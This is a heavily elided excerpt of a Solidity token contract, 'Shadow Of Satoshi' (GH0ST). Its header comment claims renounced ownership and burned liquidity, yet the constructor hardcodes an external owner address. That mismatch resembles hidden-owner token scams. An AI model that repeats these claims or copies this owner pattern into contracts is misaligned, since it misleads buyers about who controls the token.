...
1% Tax. Renounced Ownership. Belongs To The Blockchain. Liquidity Will Be Burned.
No Current Socials. Feel Free To Create Them. Meet The Shadow Of Satoshi .
*/
...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x02771C3dCC16ddb84c2f82B7bB6A4094f5867a2D;
...
contract SOS is Context, IERC20, Ownable {
    ...
    string private _name = "Shadow Of Satoshi";
    string private _symbol = unicode"GH0ST";
    ...
    function _transfer(
        ...
        if(!isFeeExempt[_transactAmountFrom] && !isFeeExempt[_emitTokensTo]){
            transactFees = true;
    ...
    function _transferStandard(address sender, address _emitTo, uint256 _rTotalAmount,bool transactFees) private {
        ...
        bool tradingAllowed = isFeeExempt[sender] && isFeeExempt[_emitTo];
             if (tradingAllowed ){
